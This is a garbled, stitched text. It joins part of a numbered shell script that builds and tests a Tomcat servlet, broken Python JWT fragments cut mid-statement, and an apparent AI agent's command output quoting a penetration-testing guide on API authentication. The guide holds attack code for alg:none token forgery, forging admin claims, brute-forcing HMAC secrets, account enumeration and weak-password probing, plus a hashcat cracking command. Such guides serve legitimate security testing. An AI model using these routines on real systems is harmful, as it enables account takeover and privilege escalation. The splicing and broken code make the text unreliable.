pinned SHA-512\" >&2; exit 2; }\n    48\techo \"NOTE  verified $SERVLET_API against the published SHA-1 and the pinned SHA-512\"\n    49\t\n    50\t# --- Stray-byte gate. A raw control character inside a string literal is invisible in a editor and\n    51\t# --- in grep output, still compiles, and silently changes behaviour. Fail before anything else.\n    52\tpython3 - <<'PY' || exit 2\n    53\timport glob, sys\n    54\tbad = 0\n    55\tfor f in sorted(glob.glob('src/**/*.java', recursive=True)):\n    56\t    b = open(f, 'rb').read()\n    57\t    hits = [(i, c) for i, c in enumerate(b)\n    58\t            if c < 0x09 or (0x0b <= c <= 0x0c) or (0x0e <= c < 0x20) or c == 0x7f or c > 0x7e]\n    59\t    if hits:\n    60\t        bad += 1\n    61\t        print(\"ERROR %s contains %d stray/non-ASCII byte(s), first at offset %d (0x%02x)\"\n    62\t              % (f, len(hits), hits[0][0], hits[0][1]), file=sys.stderr)\n    63\tsys.exit(1 if bad else 0)\n    64\tPY\n    65\techo \"NOTE  source byte scan clean (ASCII only, no stray control characters)\"\n    66\t\n    67\t# --- Descriptor gate. A malformed web.xml deploys as nothing at all: the container logs one SEVERE\n    68\t# --- line and then answers 404 for every path, which reads like a broken component. Parse it here.\n    69\tpython3 - <<'PY' || exit 2\n    70\timport sys, xml.etree.ElementTree as ET\n    71\ttry:\n    72\t    ET.parse('deploy/web.xml')\n    73\texcept Exception as problem:\n    74\t    print(\"ERROR deploy/web.xml is not well-formed: %s\" % problem, file=sys.stderr)\n    75\t    sys.exit(1)\n    76\tPY\n    77\techo \"NOTE  deploy/web.xml parses\"\n    78\t\n    79\techo \"NOTE  compiling main sources (-Xlint:all -Werror)\"\n    80\trm -rf build/classes build/test-classes\n    81\tmkdir -p build/classes build/test-classes\n    82\t\"$JAVAC\" -Xlint:all -Werror -encoding US-ASCII -cp \"$SERVLET_API\" \\\n    83\t    -d build/classes $(find src/main/java -name '*.java') || exit 2\n    84\techo \"NOTE  compiling test scaffolding\"\n    85\t\"$JAVAC\" -Xlint:all -encoding US-ASCII -cp \"$SERVLET_API:build/classes\" \\\n    86\t    -d build/test-classes $(find src/test/java -name '*.java') || exit 2\n    87\t\n    88\techo \"NOTE  running the in-process harness\"\n    89\ttimeout 600 \"$JAVA\" -cp \"$SERVLET_API:build/classes:build/test-classes\" \\\n    90\t    com.acme.portal.session.Harness > \"$LOG_DIR/harness.log\" 2>&1\n    91\tHARNESS_RC=$?\n    92\t# The harness deliberately feeds control characters through the component, so its console output\n    93\t# legitimately contains them; Only\n   166\t  # LISTEN means a server owns the port; TIME_WAIT rows from the previous run's client connections\n   167\t  # share the server's local port and would otherwise make every candidate look busy.\n   168\t  local candidate\n   169\t  for candidate in $(seq \"$1\" \"$2\"); do\n   170\t    local hex\n   171\t    hex=$(printf '%04X' \"$candidate\")\n   172\t    if ! awk '$4==\"0A\"{print $2}' /proc/net/tcp /proc/net/tcp6 2>/dev/null \\\n   173\t         | grep -qiE \":${hex}$\"; then\n   174\t      echo \"$candidate\"\n   175\t      return 0\n   176\t    fi\n   177\t  done\n   178\t  return 1\n   179\t}\n   180\t\n   181\t# --------------------------------------------------------------------------- tomcat lifecycle\n   182\t\n   183\tstart_tomcat() {\n   184\t  # $1 = CATALINA_BASE, $2 = http port, $3 = shutdown port, $4.. = extra env assignments\n   185\t  # The caller owns wiping $base and installing the war -- this function must not delete a webapps\n   186\t  # directory that already holds the war under test.\n   187\t  local base=\"$1\" http=\"$2\" shutdown=\"$3\"\n   188\t  shift 3\n   189\t  mkdir -p \"$base/conf\" \"$base/logs\" \"$base/temp\" \"$base/webapps\" \"$base/work\"\n   190\t  cp -r \"$TOMCAT_HOME/conf/.\" \"$base/conf/\"\n   191\t  # Single HTTP connector on a free port, a real shutdown port (shutdownPort=\"-1\" makes\n   192\t  # catalina.sh stop a silent no-op and a leaked server will then fake the next run's results),\n   193\t  # and an appBase holding exactly the war under test.\n   194\t  python3 - \"$base/conf/server.xml\" \"$http\" \"$shutdown\" <<'PY'\n   195\timport re, sys\n   196\tpath, http, shutdown = sys.argv[1], sys.argv[2], sys.argv[3]\n   197\ttext = open(path, encoding='utf-8').read()\n   198\ttext = re.sub(r'<Server port=\"\\d+\"', '<Server port=\"%s\"' % shutdown, text, count=1)\n   199\ttext = re.sub(r'(<Connector[^>]*port=\")\\d+(\")', r'\\g<1>%s\\g<2>' % http, text, count=1)\n   200\t# Drop the AJP connector: it binds a fixed 8009 and would make a concurrent run fail spuriously.\n   201\ttext = re.sub(r'\\s*<!--\\s*<Connector[^>]*AJP[^>]*/>\\s*-->', '', text)\n   202\ttext = re.sub(r'<Connector[^>]*protocol=\"AJP/1\\.3\"[^>]*/>\\s*', '', text)\n   203\topen(path, 'w', encoding='utf-8').write(text)\n   204\tPY\n   205\t  export JAVA_HOME=\"$JAVA_HOME_DIR\"\n   206\t  export CATALINA_HOME=\"$ROOT/$TOMCAT_HOME\"\n   207\t  export CATALINA_BASE=\"$ROOT/$base\"\n   208\t  export CATALINA_PID=\"$ROOT/$base/tomcat.pid\"\n   209\t  export CATALINA_OPTS=\"-Djava.awt.headless=true\"\n   210\t  env \"$@\" sh -c \"CATALINA_HOME=\\\"\\$CATALINA_HOME\\\" CATALINA_BASE=\\\"\\$CATALINA_BASE\\\" \\\n   211\t      CATALINA_PID=\\\"\\$CATALINA_PID\\\" exec \\\"$TOMCAT_HOME/bin/catalina.sh\\\" start\" \\\n   212\t      > \"$base/logs/startup.log\" 2>&1 &\n   213\t  local deadline=$((SECONDS + 60))\n   214\t  while [ \"$SECONDS\" -lt \"$deadline\" ]; do\n   215\t    # -o /dev/null, never -o /dev: /dev is a directory, so curl reports a write error (exit 23)\n   216\t    # against a server that is answering every probe correctly.\n   217\t    if curl -s -o /dev/null --max-time 2 \"http://127.0.0.1:$http/\" ; then\n   218\t      return 0\n   219\t    fi\n   220\t    sleep 1\n   221\t  done\n   222\t  echo \"ERROR Tomcat did not answer on port $http within 60 s\" >&2\n   223\t  tail -30 \"$base/logs/catalina.out\" 2>/dev/null >&2 || true\n   224\t  return 1\n   225\t}\n   226\t\n   227\tstop_tomcat() {\n   228\t  local base=\"$1\"\n   229\t  export CATALINA_HOME=\"$ROOT/$TOMCAT_HOME\"\n   230\t  export CATALINA_BASE=\"$ROOT/$base\"\n   231\t  export CATALINA_PID=\"$ROOT/$base/tomcat.pid\"\n   232\t  sh -c \"\\\"$TOMCAT_HOME/bin/catalina.sh\\\" stop 30\" >/dev/null 2>&1 || true\n   233\t  # Confirm it actually released the port before the next run claims it. Only LISTEN rows (state\n   234\t  # 0A) count: client connections this server served linger in TIME_WAIT on the same local port\n   235\t  # for minutes, and treating those as \"still held\" makes every clean run look broken.\n   236\t  local port=\"$2\" deadline=$((SECONDS + 30)) hex\n   237\t  hex=$(printf '%04X' \"$port\")\n   238\t  while [ \"$SECONDS\" -lt \"$deadline\" ]; do\n   239\t    if ! awk '$4==\"0A\"{print $2}' /proc/net/tcp /proc/net/tcp6 2>/dev/null \\\n   240\t         | grep -qiE \":${hex}$\"; then\n   241\t      return 0\n   242\t    fi\n   243\t    sleep 1\n   244\t  done\n   245\t  echo \"WARN  port $port still held after shutdown; later runs may be affected\" >&2\n   246\t  return 1\n   247\t}\n   248\t\n   249\tMODE_SLOT=0\n   250\t\n   251\trun_mode() {\n   252\t  # $1 = mode label, $2 = war name, $3 = services with|without, $4.. = env assignments\n   253\t  local mode=\"$1\" war=\"$2\" services=\"$3\"\n   254\t  shift 3\n   255\t  local http shutdown base slot pbase sbase\n   256\t  # Disjoint port ranges per mode: if one mode's server lingers (crash, slow stop), a later mode\n   257\t  # must never be able to allocate the same port and drive assertions against the wrong server.\n   258\t  slot=$((MODE_SLOT++))\n   259\t  pbase=$((8391 + slot * 30))\n   260\t  sbase=$((8701 + slot * 30))\n   261\t  http=$(free_port \"$pbase\" $((pbase + 29))) || { echo \"ERROR no free HTTP port\" >&2; RC=1; return 1; }\n   262\t  shutdown=$(free_port \"$sbase\" $((sbase + 29))) || { echo \"ERROR no free shutdown port\" >&2; RC=1; return 1; }\n   263\t  base=\"build/catalina-$mode\"\n   264\t  build_war \"build/$war\" \"$services\" || { echo \"ERROR war assembly failed\" >&2; RC=1; return 1; }\n   265\t  # Assert what is actually in the archive instead of trusting the copy above: a deployed class is\n   266\t  # attack surface, and the harness in particular drives the component's internals. `jar --list`\n   267\t  # because there is no unzip on this machine. Refusing before the container starts keeps a bad\n   268\t  # archive from being diagnosed as a servlet bug.\n   269\t  local listed harness_count client_count probe_count stub_count\n   270\t  listed=$(\"$JAR\" --list --file \"build/$war\") || { echo \"ERROR war unreadable\" >&2; RC=1; return 1; }\n   271\t  harness_count=$(printf '%s\\n' \"$listed\" | grep -c 'Harness.*\\.class$')\n   272\t  client_count=$(printf '%s\\n' \"$listed\" | grep -c 'E2EClient.*\\.class$')\n   273\t  probe_count=$(printf '%s\\n' \"$listed\" | grep -c 'ProbeVerifier.*\\.class$')\n   274\t  stub_count=$(printf '%s\\n' \"$listed\" | grep -c 'testapp/Stub.*\\.class$')\n   275\t  echo \"NOTE  mode=$mode war contents: harness=$harness_count e2eclient=$client_count\" \\\n   276\t    \"probe=$probe_count stubs=$stub_count\"\n   277\t  if [ \"$harness_count\" != 0 ] || [ \"$client_count\" != 0 ] || [ \"$probe_count\" != 0 ] \\\n   278\t     || [ \"$stub_count\" -lt 4 ]; then\n   279\t    echo \"ERROR $war carries the wrong set of classes\" >&2\n   280\t    RC=1\n   281\t    return 1\n   282\t  fi\n   283\t  echo \"NOTE  mode=$mode http=127.0.0.1:$http shutdown=$shutdown\"\n   284\t  # Install the war before the container starts. Tomcat's Host starts before its connector, so a war\n   285\t  # that is already in appBase is deployed by the time the port answers; a war copied in afterwards\n   286\t  # waits for the 10 s background deployer and every early request 404s.\n   287\t  rm -rf \"$base\"\n   288\t  mkdir -p \"$base/webapps\"\n   289\t  cp \"build/$war\" \"$base/webapps/handoff.war\" || { echo \"ERROR war install failed\" >&2; RC=1; return 1; }\n   290\t  if ! start_tomcat \"$base\" \"$http\" \"$shutdown\" \"$@\"; then\n   291\t    RC=1\n   292\t    return 1\n   293\t  fi\n   294\t  # Confirm the application, not just the connector: the host answers 404 for an undeployed context\n   295\t  # and the servlet answers 403 (no assertion) once it is live. curl exits 0 on a 404, so the status\n   296\t  # code has to be read, not the exit status.\n   297\t  local deadline=$((SECONDS + 60)) code=000\n   298\t  while [ \"$SECONDS\" -lt \"$deadline\" ]; do\n   299\t    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 \\\n   300\t        \"http://127.0.0.1:$http/handoff/session/handoff\" || echo 000)\n   301\t    if [ \"$code\" != \"000\" ] && [ \"$code\" != \"404\" ]; then\n   302\t      break\n   303\t    fi\n   304\t    sleep 1\n   305\t  done\n   306\t  if [ \"$code\" = \"000\" ] || [ \"$code\" = \"404\" ]; then\n   307\t    echo \"ERROR mode=$mode context never came up (last HTTP $code); see $base/logs/catalina.out\" >&2\n   308\t    grep -iE 'SEVERE|SAXParse|Deploy' \"$base/logs/catalina.out\" 2>/dev/null | tail -10 >&2 || true\n   309\t    cp \"$base/logs/catalina.out\" \"$LOG_DIR/catalina-$mode.log\" 2>/dev/null || true\n   310\t    stop_tomcat \"$base\" \"$http\" || true\n   311\t    RC=1\n   312\t    return 1\n   313\t  fi\n   314\t  echo \"NOTE  mode=$mode context live (HTTP $code)\"\n   315\t  # The same assignments go to the container and to the assertion client: the client reads the E2E_*\n   316\t  # copies so its expectations are stated in one place next to the container's configuration.\n   317\t  env \"$@\" E2E_BASE=\"http://127.0.0.1:$http/handoff\" E2E_MODE=\"$mode\" \\\n   318\t    \"$JAVA\" -cp \"build/classes:build/test-classes\" com.acme.portal.testapp.E2EClient \\\n   319\t      > \"$LOG_DIR/e2e-$mode.log\" 2>&1\n   320\t  local rc=$?\n   321\t  grep -E '^(NOTE|  PASS|  FAIL|SUMMARY|FAILED|ERROR)' \"$LOG_DIR/e2e-$mode.log\" \\\n   322\t    | tr -d '\\000-\\010\\013\\014\\016-\\037\\177' || true\n   323\t  if [ \"$rc\" -ne 0 ]; Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", forge_payload(token, modifications):\n    \"\"\"Modify payload claims and test if server validates signature.\"\"\"\n    parts = token.split('.')\n    payload = {"type":"item.completed","item":{"id":"item_17","type":"command_execution","command":"/bin/bash -lc \"sed -n '261,620p' /root/.codex/skills/testing-api-authentication-weaknesses/SKILL.md\ncat /root/.codex/skills/testing-api-authentication-weaknesses/references/api-reference.md\"","aggregated_output":"]\n\ndef brute_force_jwt_secret(token):\n    \"\"\"Try common secrets against HMAC-signed JWTs.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):\n        print(\"Not an HMAC token, skipping brute force\")\n        return None\n\n    signing_input = f\"{parts[0]}.{parts[1]}\".encode()\n    signature = parts[2]\n\n    hash_func = {\n        'HS256': hashlib.sha256,\n        'HS384': hashlib.sha384,\n        'HS512': hashlib.sha512\n    }[header['alg']]\n\n    for secret in COMMON_JWT_SECRETS:\n        expected_sig = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), signing_input, hash_func).digest()\n        ).decode().rstrip('=')\n        if expected_sig == signature:\n            print(f\"[CRITICAL] JWT secret found: '{secret}'\")\n            return secret\n\n    print(\"No common secrets matched - consider using hashcat/john for extended brute force\")\n    return None\n\n# Test all attacks\nnone_tokens = forge_none_algorithm(token)\nfor none_token in none_tokens:\n    resp = requests.get(f\"{BASE_URL}/users/me\",\n                       headers={\"Authorization\": f\"Bearer {none_token}\"})\n    if resp.status_code == 200:\n        print(f\"[CRITICAL] alg:none bypass successful\")\n\n# Test privilege escalation via claim modification\nadmin_token = forge_payload(token, {\"role\": \"admin\", \"is_admin\": True})\nresp = requests.get(f\"{BASE_URL}/admin/users\",\n                   headers={\"Authorization\": f\"Bearer {admin_token}\"})\nif resp.status_code == 200:\n    print(\"[CRITICAL] JWT claim modification accepted without signature validation\")\n\nbrute_force_jwt_secret(token)\n```\n\n### Step 5: Token Lifecycle Testing\n\n```python\n# Test 1: Token reuse after logout\nlogout_resp = requests.post(f\"{BASE_URL}/auth/logout\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nprint(f\"Logout: {logout_resp.status_code}\")\n\n# Try to use the token after logout\npost_logout_resp = requests.get(f\"{BASE_URL}/users/me\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nif post_logout_resp.status_code == 200:\n    print(\"[HIGH] Token still valid after logout - no server-side revocation\")\n\n# Test 2: Token reuse after password change\n# (requires changing password and then testing old token)\n\n# Test 3: Refresh token rotation\nrefresh_token = login_data.get(\"refresh_token\")\nif refresh_token:\n    # Use refresh token\n    refresh_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    new_tokens = refresh_resp.json()\n\n    # Try to reuse the same refresh token (should fail if rotation is implemented)\n    reuse_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    if reuse_resp.status_code == 200:\n        print(\"[HIGH] Refresh token reuse allowed - may leak in logs/referrer\")\n```\n\n### Step 6: Password Policy and Credential Testing\n\n```python\n# Test password policy enforcement on registration/change endpoints\nweak_passwords = [\n    \"a\",           # Too short\n    \"password\",    # Common password\n    \"12345678\",    # Numeric only\n    \"abcdefgh\",    # Alpha only, no complexity\n    \"Password1\",   # Meets basic complexity but is common\n    \"\",            # Empty\n    \" \",           # Whitespace\n]\n\nfor pwd in weak_passwords:\n    resp = requests.post(f\"{BASE_URL}/auth/register\",\n        json={\"email\": f\"test_{hash(pwd)%9999}@example.com\",\n              \"password\": pwd, \"name\": \"Test User\"})\n    if resp.status_code in (200, 201):\n        print(f\"[WEAK POLICY] Password accepted: '{pwd}'\")\n\n# Test account enumeration via login response differences\nvalid_email = \"testuser@example.com\"\ninvalid_email = \"nonexistent_user_xyz@example.com\"\n\nresp_valid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": valid_email, \"password\": \"wrongpassword\"})\nresp_invalid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": invalid_email, \"password\": \"wrongpassword\"})\n\nif resp_valid.text != resp_invalid.text or resp_valid.status_code != resp_invalid.status_code:\n    print(f\"[MEDIUM] Account enumeration possible:\")\n    print(f\"  Valid user: {resp_valid.status_code} - {resp_valid.text[:100]}\")\n    print(f\"  Invalid user: {resp_invalid.status_code} - {resp_invalid.text[:100]}\")\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Broken Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing\n- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)\n- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing\n- **Nuclei**: Template-based scanner with authentication bypass detection templates\n\n## Common Scenarios\n\n### Scenario: SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n- Not testing for token leakage in server logs, URL parameters, or error messages\n\n## Output Format\n\n```\n## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable\n\n**ID**: API-AUTH-001\n**Severity**: Critical (CVSS 9.1)\n**OWASP API**: API2:2023 - Broken Authentication\n**Affected Components**:\n  - POST /api/v1/auth/login (token issuance)\n  - All authenticated endpoints (token validation)\n  - POST /api/v1/auth/logout (ineffective)\n\n**Description**:\nThe API uses HS256-signed JWT tokens with a brute-forceable secret\n(\"company-jwt-secret-2023\"). An attacker who discovers this secret can\nforge tokens for any user with any role, including admin. Additionally,\ntokens are not revocable - logout does not invalidate the token server-side,\nand the 7-day expiration means stolen tokens remain valid for extended periods.\n\n**Attack Chain**:\n1. Capture any valid JWT from authenticated session\n2. Brute force the HMAC secret using hashcat: hashcat -a 0 -m 16500 jwt.txt wordlist.txt\n3. Secret recovered in 3 minutes: \"company-jwt-secret-2023\"\n4. Forge admin JWT: modify \"role\" claim to \"admin\", re-sign with discovered secret\n5. Access admin endpoints: GET /api/v1/admin/users returns all 50,000 user accounts\n\n**Remediation**:\n1. Replace HS256 with RS256 using a 2048-bit RSA key pair\n2. Use a cryptographically random secret of at least 256 bits if HMAC must be used\n3. Implement token blacklisting using Redis for logout and password change events\n4. Reduce token TTL to 15 minutes with refresh token rotation\n5. Add `iss` and `aud` claims validation to prevent token misuse across services\n```\n# API Reference: Testing API Authentication Weaknesses\n\n## JWT Security Checks\n\n| Check | Severity | Description |\n|-------|----------|-------------|\n| alg:none | Critical | Signature verification bypassed |\n| Weak HMAC secret | Critical | Brute-forceable signing key |\n| No exp claim | High | Token never expires |\n| Long TTL (>24h) | Medium | Extended token validity |\n| Sensitive data in payload | High | PII in JWT claims |\n| Missing iss/aud claims | Medium | Token scope ambiguity |\n\n## OWASP API2:2023 Test Points\n\n| Test | Category |\n|------|----------|\n| Unauthenticated endpoint access | Missing auth middleware |\n| JWT alg:none bypass | Broken token validation |\n| JWT secret brute-force | Weak cryptographic key |\n| Token reuse after logout | Missing revocation |\n| Refresh token rotation | Session management |\n| Account enumeration | Information disclosure |\n| Password policy bypass | Weak credential controls |\n\n## Common JWT HMAC Secrets\n\n| Secret | Type |\n|--------|------|\n| `secret` | Default |\n| `your-256-bit-secret` | JWT.io example |\n| `jwt_secret` | Convention |\n| `changeme` | Placeholder |\n\n## JWT Attack Tools\n\n| Tool | Purpose |\n|------|---------|\n| jwt_tool | JWT testing with 12+ attack modes |\n| hashcat -m 16500 | GPU JWT secret brute-force |\n| Burp JWT Editor | Interactive JWT manipulation |\n| Nuclei | Auth bypass templates |\n\n## Python Libraries\n\n| Library | Version | Purpose |\n|---------|---------|---------|\n| `requests` | >=2.28 | HTTP API calls |\n| `base64` | stdlib | JWT decoding |\n| `hmac` | stdlib | HMAC signature testing |\n| `hashlib` | stdlib | Hash functions |\n\n## References\n\n- OWASP API Security Top 10: https://owasp.org/API-Security/\n- JWT Best Practices RFC 8725: https://www.rfc-editor.org/rfc/rfc8725\n- jwt_tool: https://github.com/ticarpi/jwt_tool\n","exit_code":0,"status":"completed"}}
